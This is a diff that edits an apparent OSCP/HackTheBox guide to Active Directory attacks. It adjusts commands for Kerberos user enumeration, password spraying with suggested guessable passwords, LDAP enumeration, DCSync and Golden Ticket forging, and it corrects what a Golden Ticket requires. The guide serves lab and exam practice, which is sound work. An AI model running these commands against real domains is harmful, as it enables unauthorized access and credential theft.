@@ -76,7 +76,7 @@ ldapsearch -x -H ldap://$IP -b "DC=domain,DC=htb"
 If null sessions return nothing, Kerberos can often confirm valid usernames without locking anything out.
 
 ```bash
-kerbrute userenum -d domain.htb --dc $IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+kerbrute userenum -d domain.htb --dc $IP /usr/share/seclists/Usernames/top-usernames-shortlist.txt
 ```
 
 Valid users return a different response than invalid ones. No lockout risk. No failed logon events for valid users.
@@ -148,7 +148,7 @@ Got credentials → Phase 2. Only have usernames, no passwords → password spra
 
 ```bash
 # Password spraying (watch the lockout policy!)
-crackmapexec smb $IP -u users.txt -p 'Season2026!' --continue-on-success
+crackmapexec smb $IP -u users.txt -p 'Season2026!' --continue-on-success --no-bruteforce
 ```
 
 **Passwords to try:** `Welcome1`, `Password123`, `CompanyName2026!`, `Season+Year+!`. If possible, check the password policy first:
@@ -247,10 +247,10 @@ SYSVOL holds Group Policy, NETLOGON holds logon scripts. Both can contain creden
 
 ```bash
 # All users with detailed attributes
-ldapsearch -x -H ldap://$IP -D "[email protected]" -w 'password' -b "DC=domain,DC=htb" '(objectClass=person)' sAMAccountName description memberOf servicePrincipalName
+ldapsearch -x -H ldap://$IP -D "user@domain.htb" -w 'password' -b "DC=domain,DC=htb" '(objectClass=person)' sAMAccountName description memberOf servicePrincipalName
 
 # Computers
-ldapsearch -x -H ldap://$IP -D "[email protected]" -w 'password' -b "DC=domain,DC=htb" '(objectClass=computer)' cn operatingSystem
+ldapsearch -x -H ldap://$IP -D "user@domain.htb" -w 'password' -b "DC=domain,DC=htb" '(objectClass=computer)' cn operatingSystem
 ```
 
 Check the description field. Admins put passwords there more often than you'd think.
@@ -405,7 +405,7 @@ This dumps:
 
 - **Kerberos keys**
 
-You need the `Administrator` NTLM hash and the `krbtgt` hash.
+Golden Ticket needs only the `krbtgt` hash and the domain SID; the `Administrator` hash is not required.
 
 ```bash
 # DCSync only Administrator
@@ -445,7 +445,7 @@ impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain domain.
 
 # Use it
 export KRB5CCNAME=Administrator.ccache
-impacket-psexec -k -no-pass domain.htb/[email protected]
+impacket-psexec -k -no-pass 'domain.htb/Administrator@DC_IP'
 ```
 
 On OSCP, DCSync alone is usually enough to prove domain takeover. Golden Ticket is good to understand but overkill for most exam scenarios.
@@ -466,7 +466,7 @@ The simplest path. DCSync hash → PtH → shell on DC → proof.txt.
 
 ## Full Chain — Visualized
 
-```gdscript3
+```text
 Phase 1 (No Creds)
 ├── Null sessions → usernames
 ├── Kerberos user enum → usernames
